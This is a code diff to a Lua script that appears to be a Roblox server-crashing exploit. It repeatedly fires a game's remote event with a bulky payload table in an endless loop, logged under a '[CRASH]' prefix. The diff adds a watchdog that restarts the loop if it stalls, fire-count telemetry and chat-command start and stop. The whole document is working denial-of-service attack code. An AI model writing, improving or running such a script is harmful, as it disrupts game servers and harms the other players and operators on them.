@@ -12,7 +12,7 @@ local FireBurst      = 1.5
 local FrameDelay     = 0.125
 local FieldSize      = 0
 local RebuildEach    = false
-local Format         = "pair"   -- pair | compact | flat
+local Format         = "pair"
 -- ══════════════════════════════
 
 local RemoteCandidates = {
@@ -24,8 +24,14 @@ local state = {
     running = false,
     cache = nil,
     remote = nil,
+    fires = 0,
     errors = 0,
+    lastFire = 0,
 }
+
+local function log(msg)
+    print("[CRASH] " .. tostring(msg))
+end
 
 local function resolve()
     for _, path in ipairs(RemoteCandidates) do
@@ -54,7 +60,6 @@ local function build()
         for i = 1, n do root[i] = i end
         return root
     end
-
     if Format == "compact" then
         for i = 1, n do root[i] = { i, i * 2 } end
         return root
@@ -74,53 +79,90 @@ local function build()
     return root
 end
 
--- ═══════════ INFINITE LOOP ═══════════
-local function runLoop()
-    -- build payload once (or every pass if RebuildEach)
-    if RebuildEach or not state.cache then
+-- ═══════════ FIRE LOOP (can't die) ═══════════
+local function fireLoop()
+    if not state.cache then
         state.cache = build()
     end
 
     while state.running do
-        if not state.remote then
-            state.remote = resolve()
-        end
-
-        if state.remote then
-            local ok = pcall(function()
-                for _ = 1, FireBurst do
-                    state.remote:FireServer(state.cache)
-                end
-            end)
-
-            if ok then
-                state.errors = 0
-                task.wait(FrameDelay)
-            else
-                -- remote errored (rate limit, disconnect, etc.) — reset and retry
-                state.errors += 1
-                state.remote = nil
-                task.wait(0.5)
+        local ok, err = pcall(function()
+            if not state.remote then
+                state.remote = resolve()
             end
+
+            if not state.remote then
+                error("remote not found", 0)
+            end
+
+            for _ = 1, FireBurst do
+                state.remote:FireServer(state.cache)
+            end
+        end)
+
+        if ok then
+            state.fires += 1
+            state.lastFire = tick()
+            state.errors = 0
         else
-            -- remote not found yet — keep trying
-            task.wait(0.25)
+            state.errors += 1
+            state.remote = nil
         end
+
+        task.wait(FrameDelay)
     end
 end
 
+-- ═══════════ WATCHDOG — restarts loop if it dies ═══════════
+task.spawn(function()
+    while true do
+        task.wait(2)
+        if state.running and (tick() - state.lastFire) > 5 then
+            log("watchdog: loop stalled, restarting")
+            state.lastFire = tick()
+            task.spawn(fireLoop)
+        end
+    end
+end)
+
+-- ═══════════ TELEMETRY — shows if it's alive ═══════════
+task.spawn(function()
+    local lastFires = 0
+    while true do
+        task.wait(10)
+        if state.running then
+            local delta = state.fires - lastFires
+            lastFires = state.fires
+            log(string.format(
+                "alive | fires=%d (+%d/10s) | errors=%d | remote=%s",
+                state.fires, delta, state.errors,
+                state.remote and "yes" or "NO"
+            ))
+        else
+            lastFires = state.fires
+        end
+    end
+end)
+
+-- ═══════════ START / STOP ═══════════
 local function start()
     if state.running then return end
     state.running = true
+    state.fires = 0
     state.errors = 0
-    task.spawn(runLoop)
+    state.lastFire = tick()
+    state.remote = nil
+    state.cache = nil
+    log("started")
+    task.spawn(fireLoop)
 end
 
 local function stop()
+    if not state.running then return end
     state.running = false
     state.cache = nil
     state.remote = nil
-    state.errors = 0
+    log("stopped")
 end
 
 -- ═══════════ CHAT COMMANDS ═══════════
@@ -141,12 +183,8 @@ local function onMessage(msg)
     end
 end
 
--- Path 1: legacy / normal chat
-pcall(function()
-    player.Chatted:Connect(onMessage)
-end)
+pcall(function() player.Chatted:Connect(onMessage) end)
 
--- Path 2: modern TextChatService
 pcall(function()
     TextChatService.MessageReceived:Connect(function(message)
         if not message.TextSource then return end
